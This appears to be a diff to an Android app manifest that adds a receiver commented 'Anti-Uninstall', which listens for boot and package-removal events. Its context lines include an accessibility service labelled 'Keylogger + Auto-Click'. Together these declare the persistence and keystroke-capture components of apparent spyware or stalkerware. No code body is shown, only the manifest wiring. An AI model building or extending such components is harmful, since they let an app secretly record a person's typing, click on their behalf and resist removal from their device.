@@ -78,6 +78,18 @@
             </intent-filter>
         </receiver>
         
+        <!-- Package Change Receiver (Anti-Uninstall) -->
+        <receiver
+            android:name=".receivers.PackageChangeReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED" />
+            </intent-filter>
+        </receiver>
+        
         <!-- Combined Accessibility Service (Keylogger + Auto-Click) -->
         <service
             android:name=".permissions.AccessibilityHelperService"
